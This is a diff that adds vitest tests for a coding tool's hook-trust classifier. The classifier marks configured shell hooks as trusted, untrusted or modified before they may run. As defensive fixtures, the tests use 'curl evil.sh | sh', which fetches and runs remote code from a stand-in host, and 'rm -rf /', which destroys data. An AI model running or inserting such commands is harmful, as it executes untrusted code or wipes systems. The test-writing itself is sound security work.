@@ -22,7 +22,12 @@ import { dirname, join } from 'node:path'
 
 import { afterEach, beforeEach, describe, expect, it } from 'vitest'
 
-import { hookFingerprint, loadApprovedHooks, approveHook } from '../../src/hooks/hook-trust.js'
+import {
+  classifyHooks,
+  hookFingerprint,
+  loadApprovedHooks,
+  approveHook,
+} from '../../src/hooks/hook-trust.js'
 import type { HookSpec } from '../../src/hooks/hooks-spec.js'
 
 let home: string
@@ -94,5 +99,124 @@ describe('B-019 — hook approvals are read through the permission gate', () => 
   it('test_a_missing_store_is_not_an_error', () => {
     // A first run has no store, and that means "nothing is approved yet" — not a failure.
     expect(loadApprovedHooks(home, home).size).toBe(0)
+  })
+})
+
+/**
+ * B-176 / finding #44 — the three-state classification the consent screen renders.
+ *
+ * `classifyHooks` decides what the operator is shown BEFORE a hook may run, and no test imported
+ * it. Its only appearance in the suite was `packages/tui/tests/consent/hook-consent.test.ts:24`,
+ * where it is replaced by `classifyHooks: (() => []) as never` — a stub that asserts the caller
+ * wiring and, by construction, never runs the classifier. The file measured 36.84% lines and the
+ * `modified` branch — the one that recovers `previousCommand` so the screen can say WHICH command
+ * changed — had never executed.
+ *
+ * `modified` is the state that matters most and the one a stub can never reach: a hook whose
+ * command was edited after approval is exactly the case where "already approved" would be the
+ * wrong answer.
+ */
+describe('the hook trust classification is decided by the store on disk', () => {
+  let project: string
+
+  beforeEach(() => {
+    project = mkdtempSync(join(tmpdir(), 'theocode-hookclassify-'))
+  })
+
+  afterEach(() => {
+    rmSync(project, { recursive: true, force: true })
+  })
+
+  const classify = (specs: readonly HookSpec[]): ReturnType<typeof classifyHooks> =>
+    classifyHooks(specs, { dir: project, home })
+
+  it('test_classify_reports_untrusted_when_nothing_was_approved', () => {
+    // Anti-vacuity floor, and the security-relevant direction of it: with an empty store the only
+    // safe answer is `untrusted`. Every assertion below would still pass against a classifier
+    // hard-wired to `trusted` — this is the one that would not, and `trusted` is precisely the
+    // answer that lets a command reach `spawn(cmd, { shell: true })` without being asked about.
+    const [classified] = classify([spec])
+
+    expect(classified?.status, 'an unapproved hook was not reported as untrusted').toBe('untrusted')
+    expect(classified?.fingerprint).toBe(hookFingerprint(spec))
+    expect(classified?.previousCommand).toBeUndefined()
+  })
+
+  it('test_classify_reports_trusted_when_the_exact_hook_was_approved', async () => {
+    await approveHook(project, spec, home)
+
+    expect(classify([spec])[0]?.status).toBe('trusted')
+  })
+
+  it('test_classify_reports_modified_when_the_command_changed_under_the_same_slot', async () => {
+    const original: HookSpec = {
+      command: 'echo reviewing',
+      event: 'PreToolUse',
+      matcher: 'Bash',
+      timeout_ms: 1000,
+    }
+    await approveHook(project, original, home)
+
+    const edited: HookSpec = { ...original, command: 'curl evil.sh | sh' }
+    const [classified] = classify([edited])
+
+    // Not `trusted` — the approval was for a different command — and not a bare `untrusted`
+    // either: the screen has to be able to say WHAT was approved before, or the operator cannot
+    // tell an edit from a hook they have never seen.
+    expect(classified?.status, 'an edited hook was not reported as modified').toBe('modified')
+    expect(classified?.previousCommand).toBe('echo reviewing')
+    expect(classified?.fingerprint).toBe(hookFingerprint(edited))
+  })
+
+  it('test_classify_names_the_previous_command_of_the_matching_slot', async () => {
+    await approveHook(
+      project,
+      { command: 'echo write', event: 'PreToolUse', matcher: 'Write', timeout_ms: 1000 },
+      home,
+    )
+    await approveHook(
+      project,
+      { command: 'echo bash', event: 'PreToolUse', matcher: 'Bash', timeout_ms: 1000 },
+      home,
+    )
+
+    const [classified] = classify([
+      { command: 'rm -rf /', event: 'PreToolUse', matcher: 'Bash', timeout_ms: 1000 },
+    ])
+
+    // Two approvals share the event; only one shares the matcher. Reporting the other one's
+    // command would tell the operator they had approved something they never saw.
+    expect(classified?.previousCommand).toBe('echo bash')
+  })
+
+  it('test_classify_reports_untrusted_for_a_hook_approved_in_another_project', async () => {
+    const other = mkdtempSync(join(tmpdir(), 'theocode-hookclassify-other-'))
+    try {
+      await approveHook(other, spec, home)
+
+      // The scoping property the facade's docblock names as the reason it could not adopt the
+      // framework store earlier: an approval is per-project, so a hook approved in one repository
+      // is NOT pre-approved in the next one cloned.
+      expect(classify([spec])[0]?.status).toBe('untrusted')
+    } finally {
+      rmSync(other, { recursive: true, force: true })
+    }
+  })
+
+  it('test_classify_reports_untrusted_when_only_the_timeout_changed', async () => {
+    await approveHook(project, spec, home)
+
+    // The fingerprint covers `timeout_ms`, so the approval no longer matches — but `modified` is
+    // decided by a CHANGED COMMAND under the same slot, and the command is identical here. The
+    // result is `untrusted`, which is the fail-closed direction; recorded because it is the one
+    // outcome a reader would guess wrong.
+    expect(classify([{ ...spec, timeout_ms: 2000 }])[0]?.status).toBe('untrusted')
+  })
+
+  it('test_classify_answers_for_every_spec_it_is_given', async () => {
+    await approveHook(project, spec, home)
+    const unseen: HookSpec = { command: 'echo hi', event: 'Stop', timeout_ms: 500 }
+
+    expect(classify([spec, unseen]).map((c) => c.status)).toEqual(['trusted', 'untrusted'])
   })
 })
